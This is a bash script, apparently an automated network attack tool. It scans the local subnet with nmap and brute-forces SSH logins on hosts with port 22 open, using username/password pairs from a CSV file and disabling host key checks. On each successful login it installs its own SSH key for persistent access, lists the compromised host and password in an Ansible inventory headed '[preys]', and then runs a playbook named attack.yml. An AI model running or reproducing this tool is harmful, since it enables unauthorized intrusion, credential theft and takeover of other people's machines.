#!/bin/bash

ssh-keygen -t ed25519 -f ~/.ssh/ansible -N ""
# retrieve gateway ip of current interface
gatewayIp=$(route -n | grep 'UG[ \t]' | awk '{print $2}')

# echo $gatewayIp

# declare ip range for searching
search_range=$gatewayIp-10

# ./api &
# search_range=172.17.11.150-250

nmap $search_range >nmap.txt

file="nmap.txt"
ips=()
result=-1
# saving open ports of hosts in csv file
ssh_hosts=()
while IFS= read line; do
    if [[ $line == *"Nmap scan report for"* ]]; then
        ((result = result + 1))
        # ip address of scanned hosts
        ip=$(echo $line | awk '{print $5}')
        ips[$result]=$ip
    fi
    if [[ $result -gt -1 ]]; then
        if [[ $line == *"tcp"* ]]; then
            temp=$(echo $line | awk '{print $1}' | cut -d '/' -f1)
            if [[ $temp -eq 22 ]]; then
                tmp=$(echo ${ips[$result]} | cut -d ',' -f1)
                ssh_hosts+=($tmp)
            fi
            ips[$result]="${ips[$result]},$temp"
        fi
    fi
done <"$file"

rm nmap.txt

if [[ -f "ports.csv" ]]; then
    rm ports.csv
fi
for ip_port in "${ips[@]}"; do
    if [[ $ip_port == *","* ]]; then
        echo $ip_port >>ports.csv
    fi
done

echo "[preys]" >inventory
# creating ansible inventory by checking common username passwords on each host
for host in "${ssh_hosts[@]}"; do
    while IFS= read line; do
        username=$(echo $line | cut -d ',' -f1)
        password=$(echo $line | cut -d ',' -f2)
        sshpass -p "$password" ssh -o "StrictHostKeyChecking no" "$username@$host" exit
        exit_code=$?

        # Check the exit code
        if [ $exit_code -eq 0 ]; then
            sshpass -p $password ssh-copy-id -o StrictHostKeyChecking=no -i ~/.ssh/ansible.pub $username@$host
            echo "$host ansible_host=$host ansible_user=$username ansible_become_pass=$password" >>inventory
        fi
    done <"user_pass.csv"
done

ansible-playbook attack.yml 

./api
